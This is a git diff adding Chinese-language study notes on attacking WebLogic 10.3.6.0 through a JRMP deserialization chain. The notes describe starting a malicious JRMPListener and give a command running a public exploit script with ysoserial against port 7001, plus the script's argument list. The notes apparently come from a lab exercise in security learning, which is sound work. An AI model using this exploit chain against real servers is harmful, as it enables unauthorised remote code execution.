@@ -521,3 +521,30 @@ readExternal方法是Java中的一个成员方法，用于从流中读取对象�
 在`MarshalledObject`#readResolve()中，创建了一个匿名类的resolveClass()方法加了黑名单，和上面一样。
 
 ![image-20240620164915729](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240620164915729.png)
+
+## JRMP打WebLogic的链子
+
+先测试：WebLogic版本是10.3.6.0的
+
+![image-20240709173014181](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240709173014181.png)
+
+ 1、首先开启了一个`JRMPListener`的服务（这里我感觉是启动了一个恶意的服务端）
+
+![image-20240709173107729](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240709173107729.png)
+
+2、   7001是weblogic端口，后面的4444是上面恶意服务端的端
+![image-20240709173353293](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20240709173353293.png)
+
+分析一下：估计就是通过python 脚本，给weblogic发送了一个恶意序列化串，然后反序列化会调用恶意服务端的恶意链子，再反序列化RCE。。呃呃呃感觉不太对，这样不就二次反序列化了嘛。
+
+python2 44553.py 10.0.22.65 7001 ./ysoserial.jar 10.0.22.65 4444 JRMPClient
+
+```java
+ dip = sys.argv[1]  #10.0.22.65
+    dport = int(sys.argv[2])#7001
+    path_ysoserial = sys.argv[3]#./ysoserial.jar
+    jrmp_listener_ip = sys.argv[4]#10.0.22.65
+    jrmp_listener_port = sys.argv[5]#4444
+    jrmp_client = sys.argv[6]#JRMPClient
+```
+
